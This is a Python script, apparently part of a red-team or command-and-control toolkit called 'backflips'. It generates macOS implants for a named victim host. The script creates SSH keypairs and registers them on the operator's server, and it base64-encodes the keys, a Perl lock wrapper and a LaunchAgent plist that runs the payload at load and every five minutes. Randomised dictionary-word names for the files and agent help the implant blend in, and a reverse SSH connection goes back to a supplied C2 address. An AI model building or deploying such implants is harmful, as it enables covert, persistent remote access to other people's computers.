#!/usr/bin/env python3

from genericpath import exists
from opcode import haslocal
import os
import subprocess
import random
import sys
import base64
from io import StringIO
import re
import uuid
import datetime
import hashlib
from pathlib import Path

logging = True
backflipsBaseDir = Path("/opt/backflips/")
keysDir = Path(f"{backflipsBaseDir}/keys/")
payloadsDir = Path(f"{backflipsBaseDir}/payloads/")
cleanupScriptsDir = Path(f"{backflipsBaseDir}/cleanup/")

def usage():
    print ("usage: %s <username> <victim_host> <c2_fqdn/ip> <port> <remoteport>" % sys.argv[0])
    sys.exit(1)

def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out

def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None

def nocomments(stuff):
    nc = re.sub('#.*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if not logging and "log" in l:
                continue
            o += l
    return o

def getrandomwords(howmany:int):
    cleanwords = []
    wordlist = getfile("/usr/share/dict/words") 
    dirtywords = random.sample(wordlist.splitlines(), howmany)
    for word in dirtywords:
        cleanwords.append(word.replace("'s", "").lower())
    return cleanwords


def main():
    if len(sys.argv) < 5:
        usage()
    if os.getuid() != 0:
        sys.stderr.write("you must use sudo\n")
        sys.exit(1)

    # Check for a source of words for the names generator.
    if not os.path.exists("/usr/share/dict/words"):
        sys.stderr.write("'/usr/share/dict/words' not found. You need to install a dictionary with 'apt install wamerican'\n")
        sys.exit(1)

    # Check that the backflips directories are setup with rational structure
    if not(keysDir.exists() and payloadsDir.exists() and cleanupScriptsDir.exists()):
        print(f"[*] Backflips output directories are not setup, creating it now under '{backflipsBaseDir}/'...")
        payloadsDir.mkdir(parents=True, exist_ok=True)
        keysDir.mkdir(parents=True, exist_ok=True)
        cleanupScriptsDir.mkdir(parents=True, exist_ok=True)
    

    username = sys.argv[1]
    victim_hostname = sys.argv[2]
    fqdn = sys.argv[3]
    port = sys.argv[4]
    remoteport = sys.argv[5]
    payloadkeyname = "".join(getrandomwords(2))
    flockfilename = "".join(getrandomwords(1))
    lagentname = f"com.{'.'.join(getrandomwords(2))}.worker"
    imaginarypayloadname = "".join(getrandomwords(1))

    print(f"[*] Date of backflipdeploy invocation: {str(datetime.datetime.utcnow())} UTC")   
    print ("[*] victim host: %s" % victim_hostname)
    print ("[*] fqdn: %s" % fqdn)
    print ("[*] port: %s" % port)

    keyPath = f"{keysDir}/{username}-{victim_hostname}-{fqdn}"
    print ("[*] generating keypair")
    os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{keyPath}' -N ''")
    print ("[*] adding to flip's authorized keys")
    os.system(f"echo '' >> {backflipsBaseDir}/authorized_keys")
    os.system(f"cat '{keyPath}.pub' >> {backflipsBaseDir}/authorized_keys")
    os.system(f"echo \"{fqdn} $(ssh-keyscan -p {remoteport} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">{keysDir}/serverpub.pub")
    backstring= getfile(f"{keysDir}/serverpub.pub")
    backencode = backstring.encode("utf-8")
    backkey = base64.b64encode(backencode)
    pubstring = getfile(f"{keyPath}.pub")
    pubencoded = pubstring.encode("utf-8")
    pubkey = base64.b64encode(pubencoded)
    privstring = getfile(keyPath)
    privencoded = privstring.encode("utf-8")
    privkey = base64.b64encode(privencoded)

    lagentPlistXML = base64.b64encode(f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>{lagentname}</string>
  <key>Program</key>
  <string>/Users/home/Library/LaunchAgents/{imaginarypayloadname}.sh</string>
  <key>StartInterval</key>
  <integer>300</integer>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>'''.encode('utf-8')).decode('utf-8')

    motherflock = base64.b64encode(f"""#!/usr/bin/env perl
# {" ".join(getrandomwords(3))}
use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB or die;system(@ARGV);
# {" ".join(getrandomwords(2))}""".encode('utf-8')).decode('utf-8')

    implant_py = getfile(os.path.join(sys.path[0], "loadssh_template.sh"))
    cleanup_py = getfile(os.path.join(sys.path[0], "cleanup.py"))
    implant = templify(implant_py, {
        "PORT_PLACEHOLDER" : port,
        "REMOTE_PLACEHOLDER": remoteport,
        "FQDN_PLACEHOLDER" : fqdn,
        "PRIVATE_KEY_PLACEHOLDER" : privkey.decode("utf-8"),
        "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
        "BACKFLIP_PUB_PLACEHOLDER" : backkey.decode("utf-8"),
        "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
        "FLOCK_NAME_PLACEHOLDER" : flockfilename,
        "FLOCK_CODE_PLACEHOLDER" : motherflock,
        "LAGENT_XML_PLACEHOLDER" : lagentPlistXML,
        "LAGENT_NAME_PLACEHOLDER" : lagentname,
        "IMAGINARY_PAYLOAD_NAME" : imaginarypayloadname,
        })
    implant_clean = templify(cleanup_py,{
        "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
        "BACKFLIP_PUB_PLACEHOLDER" : backkey.decode("utf-8"),
        "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
        "FLOCK_NAME_PLACEHOLDER" : flockfilename,
        "LAGENT_NAME_PLACEHOLDER" : lagentname,
    })

    implantName = f"{username}-{victim_hostname}-{fqdn}-{str(uuid.uuid4())}"
    with open(f"{cleanupScriptsDir}/{implantName}_cleanup.py", 'w') as file2:
        file2.write(implant_clean)
    with open(f"{payloadsDir}/{implantName}", 'w') as file:
        file.write(implant)

    implantHash = hashlib.md5(implant.encode('utf-8')).hexdigest()
    flockHash = hashlib.md5(motherflock.encode('utf-8')).hexdigest()
    implantPrivKeyHash = hashlib.md5(payloadkeyname.encode('utf-8')).hexdigest()

    print(f"\n[+] Path of backflip public key on infra: {keyPath}")
    print(f"[I] Name of backflip private key file is '{payloadkeyname}' instead of badger")
    print(f"[I] MD5 hash for backflip private key is '{payloadkeyname}' is '{implantPrivKeyHash}'")
    print(f"\n[+] Path of backflip payload on infra: {payloadsDir}/{implantName}")
    print(f"[I] MD5 hash for backflip payload is '{implantHash}'")
    print(f"[I] Name of FLock file is '{flockfilename}.pl'")
    print(f"[I] MD5 hash for FLock is '{flockHash}'")
    print(f"[I] Name of LaunchAgent is '{lagentname}'")
    print(f"[I] MD5 hash for LaunchAgent must be calculated on the victim host.")
    print(f"\n[+] Path of cleanup script on infra: {cleanupScriptsDir}/{implantName}_cleanup.py")
    print(f"\n[+] Have a nice day!")


if __name__ == "__main__":
    main()

#
# Editor modelines  -  https://www.wireshark.org/tools/modelines.html
#
# Local variables:
# c-basic-offset: 4
# indent-tabs-mode: nil
# End:
#
# vi: set shiftwidth=4 expandtab:
# :indentSize=4:noTabs=true:
#